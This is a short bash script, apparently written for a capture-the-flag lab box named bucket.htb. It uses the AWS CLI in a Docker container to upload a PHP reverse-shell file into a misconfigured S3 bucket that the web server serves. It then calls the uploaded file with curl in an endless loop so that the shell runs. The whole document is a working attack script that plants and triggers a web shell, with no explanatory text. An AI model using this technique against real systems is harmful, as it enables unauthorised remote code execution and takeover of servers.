#/bin/bash

docker run --rm -it -v ~/.aws:/root/.aws amazon/aws-cli --endpoint-url http://s3.bucket.htb s3 cp /root/.aws/php-revshell.php s3://adserver/

echo ""
echo "[+] Executing reverse shell on s3 server"
while [ 0 ]; do
	curl http://bucket.htb/php-revshell.php &> /dev/null
done
